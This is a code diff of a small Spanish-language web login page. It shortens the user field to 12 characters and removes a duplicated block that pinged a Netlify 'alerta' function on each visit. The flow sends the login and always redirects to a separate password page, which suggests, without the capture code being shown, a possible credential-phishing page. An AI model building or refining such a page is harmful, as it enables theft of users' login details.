@@ -29,7 +29,7 @@
     <input
         type="text"
         id="loginInput"
-        maxlength="16"
+        maxlength="12"
         autocomplete="off"
         placeholder=""
     >
@@ -62,7 +62,7 @@ const loginInput = document.getElementById("loginInput");
 loginInput.addEventListener("input", () => {
     loginInput.value = loginInput.value
         .replace(/[^a-zA-Z0-9]/g, "")
-        .slice(0, 16);
+        .slice(0, 12);
 });
 
 function enviarLogin() {
@@ -84,27 +84,6 @@ function enviarLogin() {
     .finally(() => {
         window.location.href = "clave.html";
     });
-    /* 🔔 ALERTA AL INGRESAR AL SITIO */
-fetch("/.netlify/functions/alerta", {
-    method: "POST"
-});
-
-/* Solo validación visual, no se envía nada */
-const loginInput = document.getElementById("loginInput");
-
-loginInput.addEventListener("input", () => {
-    loginInput.value = loginInput.value
-        .replace(/[^a-zA-Z0-9]/g, "")
-        .slice(0, 16);
-});
-
-function continuar() {
-    if (loginInput.value.trim().length === 0) {
-        loginInput.focus();
-        return;
-    }
-
-    window.location.href = "clave.html";
 }
 </script>
 
